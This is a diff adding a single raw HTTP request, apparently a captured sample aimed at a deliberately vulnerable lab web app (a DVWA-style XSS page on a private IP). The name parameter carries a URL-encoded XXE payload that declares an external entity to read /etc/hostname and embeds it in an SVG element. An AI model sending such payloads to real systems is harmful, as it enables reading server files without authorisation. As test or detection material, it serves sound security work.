@@ -1,0 +1,10 @@
+GET /vulnerabilities/xss_r/?name=%3C%3Fxml+version%3D%221.0%22+standalone%3D%22yes%22%3F%3E%3C%21DOCTYPE+test+%5B+%3C%21ENTITY+xxe+SYSTEM+%22file%3A%2F%2F%2Fetc%2Fhostname%22+%3E+%5D%3E%3Csvg+width%3D%22128px%22+height%3D%22128px%22+xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22+xmlns%3Axlink%3D%22http%3A%2F%2Fwww.w3.org%2F1999%2Fxlink%22+version%3D%221.1%22%3E%3Ctext+font-size%3D%2216%22+x%3D%220%22+y%3D%2216%22%3E%26xxe%3B%3C%2Ftext%3E%3C%2Fsvg%3E HTTP/1.1
+Host: 10.10.3.128:2280
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://10.10.3.128:2280/vulnerabilities/xss_r/?name=
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Connection: close
+
